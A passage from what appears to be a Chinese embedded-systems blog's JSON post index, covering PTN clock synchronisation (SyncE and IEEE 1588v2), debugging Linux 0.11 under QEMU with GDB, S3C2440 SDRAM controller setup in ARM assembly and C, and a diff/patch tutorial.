ppm，而TD-SCDMA/CDMA2000需要时间同步，TD- SCDMA的精度要求为±1.5 μs。 从2004年开始，国际电信联盟电信标准部门(ITU-T)Q13/SG15开始逐步制订关于分组网同步技术的系列建议书，主要有：G.8261(定义总体需求)、G.8262(定义设备时钟的性能)、G.8264(主要定义体系结构和同步功能模块)。 IEEE在2002年发布了IEEE 1588标准，该标准定义了一种精确时间同步协议(PTP)。IEEE 1588是针对局域网组播环境制订的标准，在电信网络的复杂环境下，应用将受到限制。因此在2008年又发布了IEEE 1588v2(以下简称1588v2)，该版本中增加了适应电信网络应用的技术特点[1-5]。 因特网工程任务组(IETF)网络时间同步协议(NTP)实现了Internet上用户与时间服务器之间时间同步。 2 同步以太网技术 物理层同步技术在传统同步数字体系(SDH)网络中应用广泛。每个节点可从物理链路提取线路时钟或从外部同步接口获取时钟，从多个时钟源中进行时钟质量选择，使本地时钟锁定在质量最高的时钟源，并将锁定后的时钟传送到下游设备。通过逐级锁定，全网逐级同步到主参考时钟(PRC)被实现。对分组网络也可采取相似的技术，其原理如图1所示。 2.1 同步以太网原理 分组网络中的同步以太网技术是一种采用以太网链路码流恢复时钟的技术。以太网物理层编码采用4B/5B(FE)和8B/10B(GE)技术，平均每4个比特就要插入一个附加比特，这样在其所传输的数据码流中不会出现连续4个1或者4个0，可有效地包含时钟信息。在以太网源端接口上使用高精度的时钟发送数据，在接收端恢复并提取这个时钟，时钟性能可以保持高精度。 同步以太网原理如图2所示。在图2中发送侧设备(节点A)将高精度时钟注入以太网的物理层芯片，物理层芯片用这个高精度的时钟将数据发送出去。接收侧的设备(B节点)的物理层芯片可以从数据码流中提取这个时钟。在这个过程中时钟的精度不会有损失，可以与源端保证精确的时钟同步。同步以太网传递时钟的机制与SDH网络基本相似，也是从以太网物理链路恢复时钟，因此从恢复的时钟质量不受链路业务流量影响，可提供与SDH/SONET网络相同的时钟树部署和时钟质量，完全满足G.823规定的定时接口指标。 2.2 同步以太网SSM算法 同步状态信息(SSM)算法源于SDH的时钟同步控制，使用规则和时钟选择算法符合ITU-T G.781的规范。同步以太网的SSM控制继承了SDH网络特性，在传统时钟网的基础上通过增加以太网同步消息信道(ESMC)丰富了同步以太网的支持。G.8264里对其进行了描述。以太网同步消息信道是媒体访问控制(MAC)层的单向广播协议信道，用于在设备间传送同步状态信息SSM。设备根据ESMC报文的SSM信息选择最优的时钟源。 虽然标准SSM算法能够很好地实现网络时钟的同步，但是它有两个不足之处：一是不能很好地处理同步时钟成环的问题。需要在工程上和时钟配置的时候特别注意，保证避免出现时钟成环的情况。二是时钟信号的衰减问题。随着同步链路数的增加，同步分配过程的噪声和温度变化所引起的漂移都会使定时基准信号的质量逐渐劣化，因此在同一个同步链路上实际的可同步网元的数目是受限的，而通过标准SSM难以对节点进行跟踪统计。 中兴通讯PTN设备采用了改进的扩展SSM算法，在ESMC报文里使用两个类型-长度-取值(TLV)传递SSM信息。第一个TLV传递原SSM字节的信息为同步质量等级，遵循ITU－T标准；另外一个TLV用于路径保护。改进的算法具有如下优势： 从根本上防止了时钟成环。 当存在多条时钟路径时，自动选择最优(最短)路由。 只要存在到达主时钟的路由，网元就会跟踪主时钟，而不会进入自由振荡状态。 算法为低层分布式处理，因此各网元地位等同，操作简单。 标准的S1字节可以直接使用，不影响与其他厂家设备的对接。 3 时间同步技术 时间同步技术是频率同步的进一步发展。分组时间同步技术采用分组协议数据单元作为时钟或时间信息的载体，是实现主时钟与从时钟时间之间同步比较好的方式。其基本原理如图3所示。 3.1 网络时间协议 在IEEE 1588v2技术出现以前，在分组网络中用于时间同步的协议主要的有3种：时间协议、日时协议和网络时间协议(NTP)。NTP由纯软件实现，精度比较低。目前广泛使用的NTPv3可以达到10 ms左右的同步精度。IETF正在进行NTPv4的标准工作，支持IPv6和动态发现服务器，预计同步精度可达到10 μs级。NTP的稳定性和精度还不能满足电信网的高要求。 3.2 1588v2协议 3.2.1 1588v2协议的实现原理 1588v2是未来统一提供时间同步和频率同步的方法，能适合于不同传送平台的局间时频传送，既可以基于1588v2的时间戳以基于分组的时间传送(TOP)方式单向传递频率，也可使用IEEE 1588v2的协议实现时间同步，在PTN设备中得到广泛应用。 1588v2时间同步的核心思想是采用主从时钟方式，对时间信息进行编码，利用网络的对称性和延时测量技术，通过报文消息的双向交互实现主从时间的同步。 1588v2协议原理如图4所示。图中，Delay=(T2-T1+T4-T3)/2，Offset=(T2-T1-T4+T3)/2。主时钟(Master)与从时钟(Slave)之间发送Sync、Follow_Up、Delay_Req、Delay_Resp消息。通过T1、T2、T3、T4这4个值，主从时种可计算出Master与Slave之间延迟(Delay)，以及Master与Slave的时间差(Offset)。 同步消息类型有一般消息和事件消息。一般消息(例如Follow_Up)本身不进行时戳处理，它可以携带事件消息(如Sync)的准确发送或接收时间，还具有完成网络配置、管理，或PTP节点之间通信的功能。事件消息本身需要进行时戳处理，并可携带或不携带时戳。从时钟根据事件消息的时戳或由一般消息携带的时戳计算路径延迟和主从时钟之间的时间差。 3.2.2 时钟类型 1588v2基于Ethernet/IPv4/v6/UDP等协议之上，共定义了3种基本时钟类型：普通时钟(OC)、边界时钟(BC)和透明时钟(TC)。 普通时钟是单端口器件，可以作为主时钟或从时钟。一个同步域内只能有唯一的主时钟。主时钟的频率准确度和稳定性直接关系到整个同步网络的性能。一般可考虑PRC或同步于全球定位系统(GPS)。从时钟的性能决定时戳的精度以及Sync消息的速率。 边界时钟是多端口器件，可连接多个普通时钟或透明时钟。边界时钟的多个端口中，有一个作为从端口，连接到主时钟或其他边界时钟的主端口，其余端口作为主端口连接从时钟或下一级边界时钟的从端口，或作为备份端口。 透明时钟连接主时钟与从时钟，它对主从时钟之间交互的同步消息进行透明转发，并且计算同步消息(如Sync、Delay_Req)在本地的缓冲处理时间，并将该时间写入同步消息的CorrectionField字节块中。从时钟根据该字节中的值和同步消息的时戳值Delay和Offset实现同步。TC又可分为E2E TC和P2P TC。 3.2.3 1588v2协议的延迟 延迟是影响1588v2精度的主要因素之一。延迟主要有时戳处理延迟、节点缓冲延迟和路径延迟。 (1)时戳处理延迟 1588v2的时戳处理由硬件完成，时戳处理单元的位置处于物理层与MAC层之间。如图5所示。 硬件时戳处理可以补偿1588v2协议帧通过协议栈时消耗的时间，保证端口消息发送和接收时戳的精度。 (2)节点缓冲与路径延迟 1588v2定义两种透明时钟，用于节点缓冲延迟补偿：E2E TC和P2P TC。对于传输路径的补偿，有两种方式：时延请求反应方式和点对点时延方式。 时延请求反应方式结合E2E TC使用。TC只需要在入口和出口处在报文上标记处理时戳，时间延迟补偿的计算全部由Slave完成。 点对点时延方式结合P2P TC使用。TC参与端点间的时间延迟计算，每个端点分别与TC交互，并计算P2P之间的时间延迟。Slave利用计算结果计算延迟补偿。 3.2.4 1588v2协议在PTN上的实现 1588v2的同步精度在实际网络部署中受到多方面因素的影响，复杂网络环境(如微波和交换网络的混合组网)的使用目前还在研究当中。在纯分组的测试网络中，1588v2可以达到100 ns级的精度，但是由于网络时延复杂性和1588v2的双向路径非对称性的不可控，导致单纯依赖1588v2协议和数理分析算法去适应网络环境，存在着难以预知的风险。例如在网络负荷较重时，由于单纯1588v2报文发包频率很高，在网络中1588v2报文容易受到业务报文的影响，对时间延迟精度产生很大的影响。而降低报文发包频率，又会导致时间收敛速度较慢。另外在实际工程中，需要对1588v2算法进行双向路径非对称性补偿。非对称性主要来源于光纤不对称。测量光纤不对称通常做法是采用昂贵的时间同步测试仪和示波器进行时间误差测量，再进行非对称性时延补偿。由于PTN接入节点数量多，工作量大且需要专业人员操作，而且时间同步测试仪和示波器等相关仪器工程人员携带不方便，难以普遍推广实施，导致1588v2在工程可实施性上存在争论。 中兴通讯的PTN产品针对上述问题，提出了同步以太网基础的1588v2时间传递方案。方案核心思想是建立时钟和时间分离且高度可控的网络，排除了不可预知的风险。在同步以太网物理层稳定频率同步的基础上实施1588v2，有助于时间同步的快速收敛，而且可以降低1588v2报文发送频率，在网络负荷较重时，也不影响时间精度，使PTN时间同步具有更高可靠性和更高精度。为了解决PTN非对称性测量的工程问题，接入层PTN设备上集成了时间误差测量功能，迅速准确，不需要专业仪表，容易操作实施。 4 典型应用 4.1 同步以太网应用 同步以太网的组网应用和SDH类似，支持环网和树状网组网，通常由无线网络控制器(RNC)提供时钟源，时钟信息通过同步以太网传送后到达各个基站，从而保持全网同步状态。在树状组网中，无时钟路由保护；在环网组网中，如果当前时钟路由发生故障，通过告警、SSM信息等相关网元可以从其他方向跟踪源时钟，从而实现时钟路由保护。同步以太网组网实例如图6所示。 同步信息经过网元传递后抖动会增加，因此在网络部署中，设备如果能以最短路径跟踪时钟源，则可以获得较好的时钟质量。中兴通讯的PTN设备采用了改进的扩展SSM算法，在SSM信息中增加时钟经过的节点数，可以实现任何情况下网元以最短路径跟踪时钟源。 时钟跟踪实例如图7所示。网元C可以从B点或D点跟踪源A发出的时钟信息。从B点跟踪，时钟只经过一个节点，如果从D点跟踪，则经过了两个节点。为了使C点获得较高的时钟质量，中兴通讯的PTN设备会自动优选B点方向的时钟。 4.2 1588v2协议应用 4.2.1 替代基站GPS 1588v2典型组网应用之一是在移动接入网中替代基站GPS。TD-SCDMA和CDMA2000基站GPS天线在工程安装时需要120度净空，对环境要求较高。在室内地下等应用场景，GPS安装困难。由于GPS成本相对较高，故障率相对较高，如果PTN传送网可以为基站提供时间同步，替代GPS的功能或者作为GPS的备份使用，将会为移动网络提供更高的安全保障。 基站GPS替代1588v2组网实例如图8所示。在PTN网络中，只需其中一个网元输入时间信息，例如通过1PPS+TOD接口从GPS接收时间信息。PTN网络通过1588v2协议将时间信息分发到其他网元，再通过以太网接口或其他接口到达基站，从而实现各基站之间的时间同步。 基站侧需要支持1588v2协议或者支持时间接口。如果基站支持1588v2协议，则PTN可工作在透明时钟方式；如不支持，PTN需要工作在边界时钟方式。 4.2.2 频率恢复 1588v2的另外一个主要用途是以TOP方式进行频率恢复。在很多运营商现网环境中，很多网络是普通数据网络，不支持同步以太网。需要穿越该普通网络获取时钟频率时可使用1588v2。 频率恢复1588v2组网实例如图9所示。当分组传送网络设备A与分组传送网络设备B的中间网络同为普通数据网络时，从A点穿越普通数据网络传递1588v2的Sync报文到网络出口B点；B点通过1588v2恢复出A点的时钟，恢复的时钟作为B点的参考源，然后再根据该参考源恢复业务时钟。 5 结束语 随着PTN的逐步引入，对PTN时钟同步技术的研究将更深入。中兴通讯提出了同步以太网扩展SSM算法，以及同步以太网基础上的1588v2方案，对提高PTN网络中时间同步的精度、降低工程实施难度起到积极的作用。可以预见，PTN时钟同步技术的应用将会在移动接入网、TDM业务、物联网实时数据采集、大客户专网等领域有广泛的应用。 6 参考文献 [1] ITU-T G.8261.Timing and synchronization aspects in packet networks[S]. 2006.[2] ITU-T G.8262.Timing characteristics of synchronous Ethernet equipment slave clock (EEC) [S]. 2007.[3] ITU-T G.8264.Distribution of timing through packet networks[S]. 2008.[4] IEEE 1588.IEEE standard for a precision clock synchronization protocol for networked measurement and control systems[S]. 2008.[5] MEF 22. Mobile backhaul implementation agreement phase1[S]. 2009. 收稿日期：2010-03-08 李勤，北京邮电大学硕士毕业，现任中兴通讯承载网规划系统部PTN方案经理，主任工程师，主要研究方向为3G/LTE的PTN承载方案。","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"Gentoo+GDB+Qemu调试Linux-0.11的代码","slug":"EMBEDDED/Gentoo+GDB+Qemu调试Linux-0.11的代码","date":"2016-05-24T10:19:20.000Z","updated":"2017-07-10T08:49:15.194Z","comments":true,"path":"EMBEDDED/Gentoo+GDB+Qemu调试Linux-0.11的代码.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/Gentoo+GDB+Qemu调试Linux-0.11的代码.html","excerpt":"1.下载内核源码和根文件系统镜像 http://oldlinux.org/Linux.old/bochs/linux-0.11-devel-040809.zip Linux-0.11内核源码的改进版，可以在gcc-4.72下顺利编译通过，原生代码只能在g","text":"1.下载内核源码和根文件系统镜像http://oldlinux.org/Linux.old/bochs/linux-0.11-devel-040809.zip Linux-0.11内核源码的改进版，可以在gcc-4.72下顺利编译通过，原生代码只能在gcc-1.4下编译：https://github.com/yuanxinyu/Linux-0.11 2.编译Linux-0.11解压Linux-0.11-master.zip，进入Linux-0.11-master目录中，直接执行make就可以编译内核 会生成2个文件，一个是内核Image， 一个是内核符号文件tools/system。 3.qemu启动虚拟机提取出linux-0.11-devel-040809.zip中的hdc-0.11.img，按下面命令执行：/pc-bios是qemu源码目录中文件，包含bios文件，vgabios文件和keymap /./qemu-system-x86_64 -m 16M -L ./pc-bios/ -boot a -fda Image -hda hdc-0.11.img -vnc :0 -s -S gentoo./qemu-system-i386 -m 16M -boot a -fda Image -hda hdc-0.11.img 4.在另外一个控制台中，执行#gdb system(gdb)target remote localhost:1234 //连接gdbserer(gdb)directory ./Linux-0.11-master //设置源码目录(gdb)set architecture i8086 //设置成i8086模式，用来调试16位实模式代码(gdb)set disassembly-flavor intel //讲汇编显示成INTEL格式，好看一些(gdb)b *0x7c00 //在地址0x7c00处打断点，因为系统加电后，BIOS会把MBR中的代码加载到内 存中的0x7c00的位置，并从0x7c00处开始执行bootsect.s的代码 (gdb)c (gdb)x /16b 0x7df0 //观察0x7DFE和0x7DFF的值是否为0x55，0xAA(gdb)layout split //显示汇编窗口和源码窗口(gdb)b main //main函数下断点 参考资料：http://wwssllabcd.github.io/blog/2012/08/03/compile-linux011/http://oldlinux.org/index_cn.htmlhttp://blog.csdn.net/zhangjs0322/article/details/10152279","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"s3c2440硬件学习笔记----存储控制器","slug":"EMBEDDED/s3c2440硬件学习笔记----存储控制器","date":"2016-05-24T01:12:33.000Z","updated":"2017-07-10T08:51:36.013Z","comments":true,"path":"EMBEDDED/s3c2440硬件学习笔记----存储控制器.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/s3c2440硬件学习笔记----存储控制器.html","excerpt":"一、使用存储控制器访问外设的原理 1、S3C2440的地址空间 S3C2440对外引出27根地址线ADDR0-ADDR26，访问范围只有128MB，CPU对外还引出8根片选信号nGCS0-nGCS7，对应BANK0-BANK7，当访问BANKx","text":"一、使用存储控制器访问外设的原理 1、S3C2440的地址空间 S3C2440对外引出27根地址线ADDR0-ADDR26，访问范围只有128MB，CPU对外还引出8根片选信号nGCS0-nGCS7，对应BANK0-BANK7，当访问BANKx的地址空间时，nGCSx引脚输出低电平来选中外接设备。 这样每个128MB空间，共8个片选，对应1GB的地址空间。空间分布图如下： 左边是nGCS0片选的nor flash启动模式下的存储分配图，右边是nand flash启动模式下的存储分配图 S3C2440是32位CPU，可以使用的地址范围理论达到4GB，除去上面连接外设的1GB空间外，还有一部分是CPU内部寄存器的地址，剩下的地址空间没有使用。 2、存储控制器与外设的关系 BANK0-BANK5的连接方式类似，BANK6连接SDRAM时复杂一些，SDRAM内部是一个存储阵列，指定一个行，再指定一个列，就可以准确找到所需要的单元格，而SDRAM有4个逻辑表格(L-BANK)，下面图为一张L-BANK 那么SDRAM的访问步骤为： 1）CPU发出片选信号nSCS0（与nGCS6是同一引脚）有效，选中SDRAM芯片 2）SDRAM有4个L-BANK，需要两个地址信号来选中其中一个，即ADDR24、ADDR25，如下图 3）对被选中的芯片进行同一的行/列（存储单元）寻址 根据SDRAM芯片的列地址线数目设置CPU相关寄存器后，CPU会从32位地址中自动分出L-BANK选择信号、行地址信号、列地址信号，然后先后发出行地址信号、列地址信号。L-BANK选择信号在发出行地址信号的同时发出，并维持到列地址信号结束 如上图：行地址、列地址公用地址线ADDR2-ADDR14，使用nSRAS(R=Row)、nSCAS(C=Column)两个信号来区分它们，当nSRAS信号有效时，ADDR2-ADDR14发出的是行地址，对应地址空间bit[23:11]，当nSCAS信号有效时，ADDR2-ADDR14发出的是列地址，对应地址空间bit[10:2]。 4）找到存储单元后，被选中的芯片就要进行统一的数据传输。 开发板使用两片16bit的SDRAM芯片并联形成32位的位宽，与CPU的32根数据线DATA0-DATA31相连，BANK6的起始地址位0x30000000 3、存储控制器的寄存器使用方法 存储控制器共有13个寄存器，BANK0-BANK5只需要设置BWSCON和BANKCONx两个寄存器，BANK6、BANK7外接SDRAM时，还要设置REFRESH，BANKSIZE，MRSRB6,MRSRB7，等4个寄存器，下面分别说明 1）位宽和等待控制寄存器BWSCON BWSCON中每四位控制一个BANK，最高4位对应BANK7、接下来4位对应BANK6，依次类推，如下图 STx:启动/禁止SDRAM的数据掩码引脚 WSx:是否使用存储器的WAIT信号 DWx:设置对应BANK的位宽，0b00对应8位，0b01对应16位，0b10对应32位，0b11表示保留 比较特殊的是BANK0，它没事ST0和WS0，DW0只读，由硬件跳线决定，0b01表示16位，0b10表示32位，BANK0只支持16、32两种位宽 所以可以确定BWSCON寄存器值为：0x22011110 2）BANK控制寄存器BANKCONx(x为0-5) 这些寄存器用来控制BANK0-BANK5外接设备的访问时序，使用默认0x0700即可 3）BANK控制寄存器BANKCONx(x为6-7) MT[16:15]:设置BANK外接ROM/SRAM还是SDRAM，00=ROM/SRAM，01=保留，10=保留，11=SDRAM MT=0b00时，与BANKCON0-BANKCON5类似 MT=0b11时， Trcd[3:2]:RAS to CAS delay，设为推荐值0b01 SCAN[1:0]:SDRAM的列地址数，本开发板使用的SDRAM列地址数为9，0b00=8位，0b01=9位，0b10=10位 所以本开发板，BANKCON6/7均设为0x00018005 4）刷新控制寄存器REFRESH REFEN[23]: 0=禁止SDRAM的刷新功能，1=开启SDRAM的刷新功能 TREFMD[22]: SDRAM的刷新模式，0=CBR/Auto Refresh，1=SelfRefresh Trp[21:20]: SDRAM RAS预充电时间 00=2 clocks，01=3clocks，10=4clocks，11=不支持 Tsrc[19:18]: SDRAM半行周期时间 00=4clocks，01=5clocks，10=6clocks，11=7clocks，SDRAM行周期时间Trc=Tsrc+Trp Refresh Counter[10:0]: SDRAM刷新计数，刷新时间=(2^11+1-refresh_count)/HCLK，在未使用PLL时，HCLK=晶振频率12MHz，刷新周期为7.8125us refresh_count=2^11+1-12*7.8125=1955 REFRESH=0x008C0000+1955=0x008C07A3 5）BANKSIZE寄存器 BURST_EN[7]: 0=ARM核禁止突发传输，1=ARM核支持突发传输 SCKE_EN[5]: 0=不使用SCKE信号令SDRAM进入省电模式，1=使用SCKE信号令SDRAM进入省电模式 SCLK_EN[4]: 0=时刻发出SCLK信号，1=仅在方位SDRAM期间发出SCLK信号 BK76MAP[2:0]: 设置BANK6/7的大小，0b010=128MB/128MB，0b001=64MB/64MB，0b000=32M/32M，0b111=16M/16M，0b110=8M/8M，0b101=4M/4M，0b100=2M/2M 本开发板外接64MB的SDRAM 则本开发板BANKSIZE设为0xB1 6）SDRAM模式设置寄存器MRSRBx(x为6-7) CL[6:4]: 0b000=1clocks,0b010=2clocks,0b011=3clocks 本开发板取0b011，所以MRSRB6/7取值为0x30 二、存储控制器操作实例：使用SDRAM 从NAND Flash启动CPU时，CPU会通过内部的硬件将NAND Flash开始的4KB数据复制到成为“Steppingstone”的4KB的内部RAM（起始地址为0）中，然后跳到地址0开始执行。 本程序先设置好存储控制器，使外接的SDRAM可用，然后把程序本身从steppingstone复制到SDRAM中，最后跳到SDRAM中执行 head.S： [html] view plain copy print? 1. @* 2. 3. @ File：head.S 4. 5. @ 功能：设置SDRAM，将程序复制到SDRAM，然后跳到SDRAM继续执行 6. 7. @* 8. 9. 10. .equ MEM_CTL_BASE, 0x48000000 @存储控制器寄存器基址 11. .equ SDRAM_BASE, 0x30000000 @SDRAM起始地址 12. 13. .text 14. .global _start 15. 16. _start: 17. 18. bl disable_watch_dog @ 关闭WATCHDOG，否则CPU会不断重启 19. 20. bl memsetup @ 设置存储控制器 21. 22. bl copy_steppingstone_to_sdram @ 复制代码到SDRAM中 23. 24. ldr pc, =on_sdram @ 跳到SDRAM中继续执行 25. 26. on_sdram: 27. 28. ldr sp, =0x34000000 @ 设置堆栈 29. 30. bl main 31. 32. halt_loop: 33. 34. b halt_loop 35. 36. disable_watch_dog: 37. 38. @ 往WATCHDOG寄存器写0即可 39. 40. mov r1, #0x53000000 41. 42. mov r2, #0x0 43. 44. str r2, [r1] 45. 46. mov pc, lr @ 返回 47. 48. 49. copy_steppingstone_to_sdram: 50. 51. @ 将Steppingstone的4K数据全部复制到SDRAM中去 52. 53. @ Steppingstone起始地址为0x00000000，SDRAM中起始地址为0x30000000 54. 55. 56. mov r1, #0 57. 58. ldr r2, =SDRAM_BASE 59. 60. mov r3, #4*1024 61. 62. 1: 63. 64. ldr r4, [r1],#4 @ 从Steppingstone读取4字节的数据，并让源地址加4 65. 66. str r4, [r2],#4 @ 将此4字节的数据复制到SDRAM中，并让目地地址加4 67. 68. cmp r1, r3 @ 判断是否完成：源地址等于Steppingstone的未地址？ 69. 70. bne 1b @ 若没有复制完，继续 71. 72. mov pc, lr @ 返回 73. 74. 75. memsetup: 76. 77. @ 设置存储控制器以便使用SDRAM等外设 78. 79. 80. mov r1, #MEM_CTL_BASE @ 存储控制器的13个寄存器的开始地址 81. 82. adrl r2, mem_cfg_val @ 这13个值的起始存储地址 83. 84. add r3, r1, #52 @ 13*4 = 54 85. 86. 1: 87. 88. ldr r4, [r2], #4 @ 读取设置值，并让r2加4 89. 90. str r4, [r1], #4 @ 将此值写入存储控制寄存器，并让r1加4 91. 92. cmp r1, r3 @ 判断是否设置完所有13个寄存器 93. 94. bne 1b @ 若没有写成，继续 95. 96. mov pc, lr @ 返回 97. 98. 99. 100. .align 4 101. 102. mem_cfg_val: 103. 104. @ 存储控制器13个寄存器的设置值 105. 106. .long 0x22011110 @ BWSCON 107. 108. .long 0x00000700 @ BANKCON0 109. 110. .long 0x00000700 @ BANKCON1 111. 112. .long 0x00000700 @ BANKCON2 113. 114. .long 0x00000700 @ BANKCON3 115. 116. .long 0x00000700 @ BANKCON4 117. 118. .long 0x00000700 @ BANKCON5 119. 120. .long 0x00018005 @ BANKCON6 121. 122. .long 0x00018005 @ BANKCON7 123. 124. .long 0x008C07A3 @ REFRESH 125. 126. .long 0x000000B1 @ BANKSIZE 127. 128. .long 0x00000030 @ MRSRB6 129. 130. .long 0x00000030 @ MRSRB7 leds.c [html] view plain copy print? 1. #define GPBCON ((volatile unsigned long )0x56000010) 2. #define GPBDAT ((volatile unsigned long )0x56000014) 3. 4. 5. #define GPB5_out (1&lt;&lt;(5*2)) 6. #define GPB6_out (1&lt;&lt;(6*2)) 7. #define GPB7_out (1&lt;&lt;(7*2)) 8. #define GPB8_out (1&lt;&lt;(8*2)) 9. 10. void wait(unsigned long dly) 11. { 12. 13. for(; dly &gt; 0; dly–); 14. 15. } 16. 17. int main(void) 18. { 19. 20. unsigned long i = 0; 21. 22. GPBCON = GPB5_out|GPB6_out|GPB7_out|GPB8_out; // 将LED1-4对应的GPB5/6/7/8四个引脚设为输出 23. 24. while(1){ 25. 26. wait(30000); 27. 28. GPBDAT = (~(i&lt;&lt;5)); // 根据i的值，点亮LED1-4，实现流水灯 29. 30. if(++i == 16) 31. 32. i = 0; 33. 34. } 35. return 0; 36. 37. } 最后是Makefilesdram.bin : head.S leds.carm-linux-gcc -c -o head.o head.Sarm-linux-gcc -c -o leds.o leds.carm-linux-ld -Ttext 0x30000000 head.o leds.o -o sdram_elfarm-linux-objcopy -O binary -S sdram_elf sdram.binarm-linux-objdump -D -m arm sdram_elf &gt; sdram.disclean:rm -f sdram.dis sdram.bin sdram_elf *.o 分别汇编head.S和leds.c连接leds.o和head.o，指定代码段起始地址0x30000000(SDRAM首地址)最后转换ELF为二进制，导出汇编代码","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"补丁(patch)的制作与应用","slug":"EMBEDDED/补丁(patch)的制作与应用","date":"2016-05-18T11:14:23.000Z","updated":"2017-07-10T08:47:27.934Z","comments":true,"path":"EMBEDDED/补丁(patch)的制作与应用.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/补丁(patch)的制作与应用.html","excerpt":"1. 如果hack了开源代码，为了方便分享（如提交Bug）或自己留存使用，一般都要制作一个补丁（Patch）。在从源码安装软件时，也难免要应用些别人做好的补丁。本文介绍如何制作和应用补丁。[1]%E7%9A%84%E5%88%B6%E4%BD%9C%E","text":"如果hack了开源代码，为了方便分享（如提交Bug）或自己留存使用，一般都要制作一个补丁（Patch）。在从源码安装软件时，也难免要应用些别人做好的补丁。本文介绍如何制作和应用补丁。[1]%E7%9A%84%E5%88%B6%E4%BD%9C%E4%B8%8E%E5%BA%94%E7%94%A8#cite_note-0) &nbsp; 目录 · 1 命令简介%E7%9A%84%E5%88%B6%E4%BD%9C%E4%B8%8E%E5%BA%94%E7%94%A8#.E5.91.BD.E4.BB.A4.E7.AE.80.E4.BB.8B) o 1.1 diff%E7%9A%84%E5%88%B6%E4%BD%9C%E4%B8%8E%E5%BA%94%E7%94%A8#diff) o 1.2 patch%E7%9A%84%E5%88%B6%E4%BD%9C%E4%B8%8E%E5%BA%94%E7%94%A8#patch) o 1.3 应用%E7%9A%84%E5%88%B6%E4%BD%9C%E4%B8%8E%E5%BA%94%E7%94%A8#.E5.BA.94.E7.94.A8) · 2 patch文件构成%E7%9A%84%E5%88%B6%E4%BD%9C%E4%B8%8E%E5%BA%94%E7%94%A8#patch.E6.96.87.E4.BB.B6.E6.9E.84.E6.88.90) · 3 实例分析%E7%9A%84%E5%88%B6%E4%BD%9C%E4%B8%8E%E5%BA%94%E7%94%A8#.E5.AE.9E.E4.BE.8B.E5.88.86.E6.9E.90) o 3.1 单文件补丁%E7%9A%84%E5%88%B6%E4%BD%9C%E4%B8%8E%E5%BA%94%E7%94%A8#.E5.8D.95.E6.96.87.E4.BB.B6.E8.A1.A5.E4.B8.81) o 3.2 文件夹补丁%E7%9A%84%E5%88%B6%E4%BD%9C%E4%B8%8E%E5%BA%94%E7%94%A8#.E6.96.87.E4.BB.B6.E5.A4.B9.E8.A1.A5.E4.B8.81) · 4 参考资料%E7%9A%84%E5%88%B6%E4%BD%9C%E4%B8%8E%E5%BA%94%E7%94%A8#.E5.8F.82.E8.80.83.E8.B5.84.E6.96.99)命令简介 用到的两个命令是diff和patch。 diff diff可以比较两个东西，并可同时记录下二者的区别。制作补丁时的一般用法和常见选项为： diff 【选项】 源文件（夹） 目的文件（夹） -r 递归。设置后diff会将两个不同版本源代码目录中的所有对应文件全部都进行一次比较，包括子目录文件。 -N 选项确保补丁文件将正确地处理已经创建或删除文件的情况。 -u 输出每个修改前后的3行，也可以用-u5等指定输出更多上下文。 -E, -b, -w, -B, –strip-trailing-cr 忽略各种空白，可参见文档，按需选用。 patch patch的作用则是将diff记录的结果（即补丁）应用到相应文件（夹）上。最常见的用法为： patch -pNUM &lt;patchfile&gt; -p Num 忽略几层文件夹，随后详解。 -E 选项说明如果发现了空文件，那么就删除它 -R 取消打过的补丁。 为了解释 -p 参数，需要看看如下patch文件片段： — old/modules/pcitable Mon Sep 27 11:03:56 1999 +++ new/modules/pcitable Tue Dec 19 20:05:41 2000 如果使用参数 -p0，那就表示从当前目录找一个叫做old的文件夹，再在它下面寻找 modules/pcitable 文件来执行patch操作。而如果使用参数 -p1，那就表示忽略第一层目录（即不管old），从当前目录寻找 modules 的文件夹，再在它下面找pcitable。 应用 利用以上命令，处理单个文件补丁的方法： # __产生补丁 diff -uN from-file to-file &gt;to-file.patch &nbsp; # __打补丁 patch -p0 &lt; to-file.patch &nbsp; # __取消补丁 patch -RE -p0 &lt; to-file.patch 对整个文件夹打补丁的情况： # __产生补丁 diff -uNr from-docu to-docu &gt;to-docu.patch &nbsp; # __打补丁 cd to-docu patch -p1 &lt; to-docu.patch &nbsp; # __取消补丁 patch -R -p1 &lt;to-docu.patch 另外，使用版本控制工具时，可以直接用svn diff或git diff生成补丁文件。 值得一提的是，由于应用补丁时的目标代码和生成补丁时的代码未必相同，打补丁操作可能失败。补丁失败的文件会以.rej结尾，下面命令可以找出所有rej文件： find . -name ‘*.rej’ patch**文件构成** 补丁文件里到底存储了哪些信息呢？看看这个例子： — test0 2006-08-18 09:12:01.000000000 +0800 +++ test1 2006-08-18 09:13:09.000000000 +0800 @@ -1,3 +1,4 @@ +222222 111111 -111111 +222222 111111 补丁头 补丁头是分别由—/+++开头的两行，用来表示要打补丁的文件。—开头表示旧文件，+++开头表示新文件。 一个补丁文件中的多个补丁 一个补丁文件中可能包含以—/+++开头的很多节，每一节用来打一个补丁。所以在一个补丁文件中可以包含好多个补丁。 块 块是补丁中要修改的地方。它通常由一部分不用修改的东西开始和结束。他们只是用来表示要修改的位置。他们通常以@@开始，结束于另一个块的开始或者一个新的补丁头。 块的缩进 块会缩进一列，而这一列是用来表示这一行是要增加还是要删除的。 块的第一列 +号表示这一行是要加上的。-号表示这一行是要删除的。没有加号也没有减号表示这里只是引用的而不需要修改。 实例分析 单文件补丁 设当前目录有文件 test0： 111111 111111 111111 和文件test1： 222222 111111 222222 111111 使用diff创建补丁test1.patch diff -uN test0 test1 &gt; test1.patch 因为是单个文件，故不需要 -r 选项。此命令得到如下补丁： — test0 2006-08-18 09:12:01.000000000 +0800 +++ test1 2006-08-18 09:13:09.000000000 +0800 @@ -1,3 +1,4 @@ +222222 111111 -111111 +222222 111111 要应用补丁，只需： $ patch -p0 &lt; test1.patch patching file test0 